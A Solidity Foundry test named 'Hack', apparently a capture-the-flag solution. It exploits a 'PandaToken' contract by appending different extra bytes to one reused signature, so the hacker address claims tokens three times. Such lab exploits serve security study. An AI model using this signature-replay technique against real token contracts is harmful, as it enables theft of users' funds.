// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PandaToken} from "src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function getVRS(uint8 v, bytes32 r, bytes32 s,uint8 hackCode) internal pure returns (bytes memory) {
        return abi.encodePacked(v,r,s,hackCode);
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        bytes memory signatureOne = getVRS(v,r,s,1);
        pandatoken.getTokens(1 ether, signatureOne);
        assertEq(pandatoken.balanceOf(hacker), 1 ether);
            
        bytes memory signatureTwo = getVRS(v,r,s,2);
        pandatoken.getTokens(1 ether, signatureTwo);
        assertEq(pandatoken.balanceOf(hacker), 2 ether);

        bytes memory signatureThree = getVRS(v,r,s,3);
        pandatoken.getTokens(1 ether, signatureThree);   

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}